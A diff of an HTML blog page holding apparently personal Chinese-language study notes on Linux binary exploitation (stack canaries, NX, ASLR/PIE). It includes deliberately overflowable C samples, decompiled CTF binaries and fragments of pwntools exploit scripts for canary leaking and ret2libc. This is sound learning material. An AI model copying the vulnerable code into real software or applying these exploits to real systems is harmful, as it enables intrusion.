@@ -29,7 +29,7 @@
 
     <script src="/libs/jquery/jquery.min.js"></script>
 
-<meta name="generator" content="Hexo 5.3.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
 
 
 
@@ -405,10 +405,10 @@
 
 <h4 id="Stack-Canaries、"><a href="#Stack-Canaries、" class="headerlink" title="Stack Canaries、"></a>Stack Canaries、</h4><p>​        对下述代码进行试验。</p>
 <pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
-<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
     <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
     <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
 lijianbo@ubuntu<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop$ gcc <span class="token operator">-</span>fno<span class="token operator">-</span>stack<span class="token operator">-</span>protector canary<span class="token punctuation">.</span>c <span class="token operator">-</span>o fno<span class="token punctuation">.</span>out              #关闭
 lijianbo@ubuntu<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop$ python <span class="token operator">-</span>c <span class="token string">'print("A"*30)'</span> <span class="token operator">|</span> <span class="token punctuation">.</span><span class="token operator">/</span>fno<span class="token punctuation">.</span>out
@@ -454,7 +454,7 @@ lijianbo@ubuntu:~/Desktop$ chmod 777 messager
 lijianbo@ubuntu:~/Desktop$ ./messager
 open flag failed: No such file or directory
 ...
-lijianbo@ubuntu:~/Desktop$ echo &quot;FLAG&#123;lijianbo666&#125;&quot; &gt; flag
+lijianbo@ubuntu:~/Desktop$ echo &quot;FLAG{lijianbo666}&quot; &gt; flag
 lijianbo@ubuntu:~/Desktop$ cd messager1
 lijianbo@ubuntu:~/Desktop/messager1$ ./messager
 [+]start..
@@ -464,7 +464,7 @@ lijianbo@ubuntu:~/Desktop/messager1$ ./messager
 liser</code></pre>
 <p>​        因为我只有这个题目的本地文件，好像是要读取一个flag，但是没有flag文件，一会儿托IDA里面看一下，自己写一个进去。</p>
 <pre class=" language-c"><code class="language-c"><span class="token keyword">signed</span> __int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span>
-<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+<span class="token punctuation">{</span>
   <span class="token keyword">int</span> optval<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-10h]</span>
   __pid_t v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+4h] [rbp-Ch]</span>
   <span class="token keyword">unsigned</span> __int64 v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-8h]</span>
@@ -481,60 +481,60 @@ liser</code></pre>
   <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+]socket.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   dword_602140 <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_602140 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
-  <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+  <span class="token punctuation">{</span>
     <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"socket"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
-  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
   optval <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
   <span class="token function">setsockopt</span><span class="token punctuation">(</span>dword_602140<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>optval<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+]bind.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">bind</span><span class="token punctuation">(</span>dword_602140<span class="token punctuation">,</span> <span class="token operator">&amp;</span>addr<span class="token punctuation">,</span> len<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
-  <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+  <span class="token punctuation">{</span>
     <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"bind error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
-  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
   <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+]listen.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">listen</span><span class="token punctuation">(</span>dword_602140<span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
-  <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+  <span class="token punctuation">{</span>
     <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"listen"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
-  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
   <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
-  <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+  <span class="token punctuation">{</span>
     fd <span class="token operator">=</span> <span class="token function">accept</span><span class="token punctuation">(</span>dword_602140<span class="token punctuation">,</span> <span class="token operator">&amp;</span>stru_602130<span class="token punctuation">,</span> <span class="token operator">&amp;</span>addr_len<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span> fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
-    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+    <span class="token punctuation">{</span>
       <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"accept"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
     <span class="token function">send</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token string">"Welcome!\n"</span><span class="token punctuation">,</span> <span class="token number">9uLL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     v5 <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
-    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+    <span class="token punctuation">{</span>
       <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"fork"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v5 <span class="token punctuation">)</span>
       <span class="token keyword">break</span><span class="token punctuation">;</span>
     <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
   <span class="token function">signal</span><span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__sighandler_t<span class="token punctuation">)</span>handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">3u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_400BE9</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
-  <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+  <span class="token punctuation">{</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">send</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token string">"Message receive failed\n"</span><span class="token punctuation">,</span> <span class="token number">0x19uLL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
-    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+    <span class="token punctuation">{</span>
       <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"send"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
-  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+  <span class="token punctuation">}</span>
   <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">send</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token string">"Message received!\n"</span><span class="token punctuation">,</span> <span class="token number">0x12uLL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
-  <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+  <span class="token punctuation">{</span>
     <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"send"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
-  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
   <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
-<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre>
+<span class="token punctuation">}</span></code></pre>
 <p>​        拖入64位IDA中F5分析程序。跟进sub_400B76和sub_400BE9</p>
 <p><img src="/images/3.png"></p>
 <p><img src="/images/4.png"></p>
@@ -573,7 +573,7 @@ liser</code></pre>
     leak_canary<span class="token punctuation">(</span><span class="token punctuation">)</span>
     pwn<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
 <h4 id="sixstars-CTF-2018：babystack【未解决】"><a href="#sixstars-CTF-2018：babystack【未解决】" class="headerlink" title="sixstars CTF 2018：babystack【未解决】"></a>sixstars CTF 2018：babystack【未解决】</h4><p>​        这题涉及到的东西有点多，不光是泄露canary，还有设计栈结构和查着gadget啥的。一点点记录吧。从GitHub上下载题目源码。并编译成开启Full RELRO 、Canary、NX保护的64位程序。</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/sixstars/starctf2018/blob/master/pwn-babystack/bs.c">https://github.com/sixstars/starctf2018/blob/master/pwn-babystack/bs.c</a></p>
+<p><a href="https://github.com/sixstars/starctf2018/blob/master/pwn-babystack/bs.c" target="_blank" rel="noopener">https://github.com/sixstars/starctf2018/blob/master/pwn-babystack/bs.c</a></p>
 <pre><code>lijianbo@ubuntu:~/Desktop/bs1$ gcc -fstack-protector-strong -s -pthread bs.c -o bs -Wl,-z,now,-z,relro
 lijianbo@ubuntu:~/Desktop/bs1$ file bs
 bs: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=41e0dcc65d970cc20028e602bc589baf544bb4ad, stripped
@@ -588,7 +588,7 @@ lijianbo@ubuntu:~/Desktop/bs1$ pwn checksec bs
 <p><img src="/images/5.png"></p>
 <p>​        程序通过pthread_creat()创建线程，运行函数start_routine。跟进start_routine，s存在溢出。</p>
 <pre><code>void *__fastcall start_routine(void *a1)
-&#123;
+{
   unsigned __int64 v2; // [rsp+8h] [rbp-1018h]
   char s; // [rsp+10h] [rbp-1010h]
   unsigned __int64 v4; // [rsp+1018h] [rbp-8h]
@@ -599,22 +599,22 @@ lijianbo@ubuntu:~/Desktop/bs1$ pwn checksec bs
   puts(&quot;How many bytes do you want to send?&quot;);
   v2 = sub_400906();
   if ( v2 &lt;= 0x10000 )
-  &#123;
+  {
     sub_400957(0, (__int64)&amp;s, v2);
     puts(&quot;It&#39;s time to say goodbye.&quot;);
-  &#125;
+  }
   else
-  &#123;
+  {
     puts(&quot;You are greedy!&quot;);
-  &#125;
+  }
   return 0LL;</code></pre>
 <p>​        这里书上提到了TLS，稍等具体了解一下TLS，书上的大概意思就是通过pthread_creat()创建的线程，glibc会在内存高地址对TLS进行初始化，从TLS减去固定值得到新线程用于栈寄存器的值。</p>
 <p>​        这里给我搞糊涂了，又是创建线程，又是TLS什么的，书上在这道例题前面有介绍TLS，但是晦涩难懂，我尝试找找网上其他关于这部分的解释和pthread_creat()是怎么回事。</p>
-<p>​        首先是pthread_creat()，这里有个概念是多线程，早有耳闻，但是不知道啥意思，我一开始以为是C语言的函数，但不是这样的。首先看看百度百科对于线程的解释。<strong>线程是程序中一个单一的顺序控制流程。在单个程序中同时运行多个线程完成不同的工作，称为多线程。线程和进程的区别在于，子进程和<a target="_blank" rel="noopener" href="https://baike.so.com/doc/3943920-4138829.html">父进程</a>有不同的代码和数据空间，而多个线程则共享数据空间，每个线程有自己的执行<a target="_blank" rel="noopener" href="https://baike.so.com/doc/4915223-5133919.html">堆栈</a>和<a target="_blank" rel="noopener" href="https://baike.so.com/doc/5796963-6009758.html">程序计数器</a>为其执行上下文.多线程主要是为了节约CPU时间，发挥利用，根据具体情况而定。线程的运行中需要使用计算机的<a target="_blank" rel="noopener" href="https://baike.so.com/doc/176561-186541.html">内存</a>资源和<a target="_blank" rel="noopener" href="https://baike.so.com/doc/735320-778444.html">CPU</a>。</strong></p>
+<p>​        首先是pthread_creat()，这里有个概念是多线程，早有耳闻，但是不知道啥意思，我一开始以为是C语言的函数，但不是这样的。首先看看百度百科对于线程的解释。<strong>线程是程序中一个单一的顺序控制流程。在单个程序中同时运行多个线程完成不同的工作，称为多线程。线程和进程的区别在于，子进程和<a href="https://baike.so.com/doc/3943920-4138829.html" target="_blank" rel="noopener">父进程</a>有不同的代码和数据空间，而多个线程则共享数据空间，每个线程有自己的执行<a href="https://baike.so.com/doc/4915223-5133919.html" target="_blank" rel="noopener">堆栈</a>和<a href="https://baike.so.com/doc/5796963-6009758.html" target="_blank" rel="noopener">程序计数器</a>为其执行上下文.多线程主要是为了节约CPU时间，发挥利用，根据具体情况而定。线程的运行中需要使用计算机的<a href="https://baike.so.com/doc/176561-186541.html" target="_blank" rel="noopener">内存</a>资源和<a href="https://baike.so.com/doc/735320-778444.html" target="_blank" rel="noopener">CPU</a>。</strong></p>
 <p>​        还是晦涩，上张图。</p>
 <p><img src="/images/6.png"></p>
-<p>​        pthread_create()就是（Unix、Linux、Mac OS X）等操作系统的创建线程的函数。它的功能是<strong>创建线程（实际上就是确定调用该线程函数的入口点）</strong>，在线程创建以后，就开始运行相关的线程函数。pthread_create()的返回值表示成功，返回0；表示出错，返回表示-1。(具体内容查看<a target="_blank" rel="noopener" href="https://blog.csdn.net/wushuomin/article/details/80051295">https://blog.csdn.net/wushuomin/article/details/80051295</a>)</p>
-<p>​        这里的TLS不是安全传输层协议，是一个叫线程局部存储（Tread Local Storage）的一个东西。具体细节访问<a target="_blank" rel="noopener" href="https://www.cnblogs.com/stli/archive/2010/11/03/1867852.html">https://www.cnblogs.com/stli/archive/2010/11/03/1867852.html</a></p>
+<p>​        pthread_create()就是（Unix、Linux、Mac OS X）等操作系统的创建线程的函数。它的功能是<strong>创建线程（实际上就是确定调用该线程函数的入口点）</strong>，在线程创建以后，就开始运行相关的线程函数。pthread_create()的返回值表示成功，返回0；表示出错，返回表示-1。(具体内容查看<a href="https://blog.csdn.net/wushuomin/article/details/80051295" target="_blank" rel="noopener">https://blog.csdn.net/wushuomin/article/details/80051295</a>)</p>
+<p>​        这里的TLS不是安全传输层协议，是一个叫线程局部存储（Tread Local Storage）的一个东西。具体细节访问<a href="https://www.cnblogs.com/stli/archive/2010/11/03/1867852.html" target="_blank" rel="noopener">https://www.cnblogs.com/stli/archive/2010/11/03/1867852.html</a></p>
 <p>​        这里就说一下他的功能，它主要是为了避免多个线程同时访存同一全局变量或者静态变量时所导致的冲突，尤其是多个线程同时需要修改这一变量时。为了解决这个问题，我们可以通过TLS机制，为每一个使用该全局变量的线程都提供一个变量值的副本，每一个线程均可以独立地改变自己的副本，而不会和其它线程的副本冲突。从线程的角度看，就好像每一个线程都完全拥有该变量。而从全局变量的角度上来看，就好像一个全局变量被克隆成了多份副本，而每一份副本都可以被一个线程独立地改变。</p>
 <p>​        讲道理更晕了，先贴上解题代码，这部分有待理解。</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
@@ -658,14 +658,14 @@ io<span class="token punctuation">.</span>send<span class="token punctuation">(<
 io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
 <h3 id="NX（堆栈不可执行）"><a href="#NX（堆栈不可执行）" class="headerlink" title="NX（堆栈不可执行）"></a>NX（堆栈不可执行）</h3><p>​        NX我之前试验过挺多的，这里稍微加快一下，部分内容直接上代码。主要对抗ret2shellcode，ROP就完了。对下述代码分别开关NX的情况下进行漏洞利用。</p>
 <pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
-<span class="token keyword">void</span> <span class="token function">vuln_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+<span class="token keyword">void</span> <span class="token function">vuln_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
     <span class="token function">read</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
-<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token function">vuln_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> <span class="token string">"Hello world!\n"</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre>
+<span class="token punctuation">}</span></code></pre>
 <p>​        首先保护全关，正常checksec漏洞利用。</p>
 <pre><code>lijianbo@ubuntu:~/Desktop/NX1$ gcc -m32 -fno-stack-protector -z execstack NX.c
 lijianbo@ubuntu:~/Desktop/NX1$ checksec a.out
@@ -676,7 +676,7 @@ lijianbo@ubuntu:~/Desktop/NX1$ checksec a.out
     NX:       NX disabled
     PIE:      No PIE (0x8048000)
     RWX:      Has RWX segments</code></pre>
-<p>​        这里出现问题了，好像是gdb环境和真实环境地址是存在差距的，返回地址需要通过core dump来确定。core dump的介绍：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/s-lisheng/p/11278193.html">https://www.cnblogs.com/s-lisheng/p/11278193.html</a></p>
+<p>​        这里出现问题了，好像是gdb环境和真实环境地址是存在差距的，返回地址需要通过core dump来确定。core dump的介绍：<a href="https://www.cnblogs.com/s-lisheng/p/11278193.html" target="_blank" rel="noopener">https://www.cnblogs.com/s-lisheng/p/11278193.html</a></p>
 <pre><code>lijianbo@ubuntu:~/Desktop/NX1$ ulimit -c unlimited
 lijianbo@ubuntu:~/Desktop/NX1$ ulimit -c
 unlimited
@@ -721,7 +721,7 @@ lijianbo@ubuntu:~/Desktop/NX1$ checksec b.out
     PIE:      No PIE (0x8048000)
 ...
 pwndbg&gt; p system
-$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e3cdb0 &lt;__libc_system&gt;
+$1 = {&lt;text variable, no debug info&gt;} 0xf7e3cdb0 &lt;__libc_system&gt;
 pwndbg&gt; search &quot;/bin/sh&quot;
 libc-2.23.so    0xf7f5db0b das     /* &#39;/bin/sh&#39; */
 ...
@@ -736,14 +736,14 @@ io.interactive()</code></pre>
 <h3 id="ASLR和PIE"><a href="#ASLR和PIE" class="headerlink" title="ASLR和PIE"></a>ASLR和PIE</h3><p>​        理论不记录了，校赛的时候也打过交道了。就是那次莫名其妙我的本地程序PIE就开了。</p>
 <p>​        还是这个程序，用gcc开启ASLR关闭PIE。</p>
 <pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
-<span class="token keyword">void</span> <span class="token function">vuln_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+<span class="token keyword">void</span> <span class="token function">vuln_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
     <span class="token function">read</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
-<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token function">vuln_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> <span class="token string">"Hello world!\n"</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
 lijianbo@ubuntu<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop<span class="token operator">/</span>ASLR1$ gcc <span class="token operator">-</span>m32 <span class="token operator">-</span>fno<span class="token operator">-</span>stack<span class="token operator">-</span>protector <span class="token operator">-</span>z noexecstack <span class="token operator">-</span>no<span class="token operator">-</span>pie demo<span class="token punctuation">.</span>c <span class="token operator">-</span>o nopie<span class="token punctuation">.</span>out
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
